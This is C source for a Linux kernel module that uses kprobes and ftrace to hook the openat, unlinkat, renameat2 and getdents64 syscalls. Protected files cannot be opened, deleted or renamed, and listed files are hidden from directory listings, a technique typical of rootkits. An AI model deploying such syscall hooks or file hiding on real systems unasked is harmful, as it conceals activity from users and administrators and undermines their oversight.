#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/kernel.h>
#include <asm/signal.h>
#include <linux/delay.h>
#include <linux/fcntl.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>

#define FILE_NAME (strrchr(__FILE__, '/') ? strrchr(__FILE__, '/') + 1 : __FILE__)
#define DMSG(msg_fmt, msg_args...) \
    printk(KERN_INFO "OS: %s(%04u): " msg_fmt "\n", FILE_NAME, __LINE__, ##msg_args)

#define MAX_BUF_SIZE 1000

extern char hidden_files[100][50];
extern int hidden_index;
extern char protected_files[100][50];
extern int protected_index;
extern char protected_dirs[100][50];
extern int dir_index;

int check_fs_blocklist(char *input);
int check_fs_hidelist(char *input);
int check_dir_blocklist(char *input);


static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
        .symbol_name = name
    };
    unsigned long retval;

    if (register_kprobe(&kp) < 0) 
    {
        DMSG("register_kprobe failed for %s", name);
        return 0;
    }
    retval = (unsigned long) kp.addr;
    unregister_kprobe(&kp);
    return retval;
}


#define USE_FENTRY_OFFSET 0

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = lookup_name(hook->name);

    if (!hook->address) {
        pr_debug("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    regs->ip = (unsigned long)hook->function;
}

int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

#define PTREGS_SYSCALL_STUBS 1


static char *get_filename(const char __user *filename)
{
    char *kernel_filename=NULL;

    kernel_filename = kmalloc(4096, GFP_KERNEL);
    if (!kernel_filename)
        return NULL;

    if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
        kfree(kernel_filename);
        return NULL;
    }

    return kernel_filename;
}


static asmlinkage long (*real_sys_getdents64)(const struct pt_regs *);

static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;
    int ret = real_sys_getdents64(regs);

    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
    {
        return ret;
    }

    long error;
    error = copy_from_user(dirent_ker, dirent, ret);

    if (error)
    {
        kfree(dirent_ker);
        return ret;
    }

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if (check_fs_hidelist(current_dir->d_name))
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
    {
        DMSG("copy_to_user error");
    }

    kfree(dirent_ker);
    return ret;
}

static asmlinkage long (*real_sys_renameat2)(struct pt_regs *regs);

static asmlinkage long fh_sys_renameat2(struct pt_regs *regs)
{
    long ret=0;
    char *kernel_filename = get_filename((void*) regs->si);

    if (check_fs_blocklist(kernel_filename) || check_dir_blocklist(kernel_filename))
    {

        pr_info("blocked to not rename file : %s\n", kernel_filename);
        kfree(kernel_filename);
        return -EPERM;

    }

    kfree(kernel_filename);
    ret = real_sys_renameat2(regs);

    return ret;
}



static asmlinkage long (*real_sys_openat)(struct pt_regs *regs);

static asmlinkage long fh_sys_openat(struct pt_regs *regs)
{
	char *kernel_filename;
	kernel_filename = get_filename((void*) regs->si);

	if (check_fs_blocklist(kernel_filename))
	{
		DMSG("block open file : %s", kernel_filename);
		kfree(kernel_filename);
		return -EPERM;
	}

	kfree(kernel_filename);

	return real_sys_openat(regs);
}


static asmlinkage long (*real_sys_unlinkat) (struct pt_regs *regs);

static asmlinkage long fh_sys_unlinkat(struct pt_regs *regs)
{
    char *kernel_filename = get_filename((void*) regs->si);

    if (check_fs_blocklist(kernel_filename) || check_dir_blocklist(kernel_filename))
    {

        pr_info("blocked to not remove file : %s\n", kernel_filename);
        kfree(kernel_filename);
        return -EPERM;

    }

    kfree(kernel_filename);
    return real_sys_unlinkat(regs);
}

#define SYSCALL_NAME(name) ("__x64_" name)

#define HOOK(_name, _function, _original)	\
{					\
.name = SYSCALL_NAME(_name),	\
.function = (_function),	\
.original = (_original),	\
}

static struct ftrace_hook demo_hooks[] = {
    HOOK("sys_openat", fh_sys_openat, &real_sys_openat),
    HOOK("sys_unlinkat", fh_sys_unlinkat, &real_sys_unlinkat),
    HOOK("sys_renameat2", fh_sys_renameat2, &real_sys_renameat2),
    HOOK("sys_getdents64", fh_sys_getdents64, &real_sys_getdents64)
};


static int start_hook_resources(void)
{
    int err;
    err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
    if (err)
    {
        return err;
    }
    return 0;
}
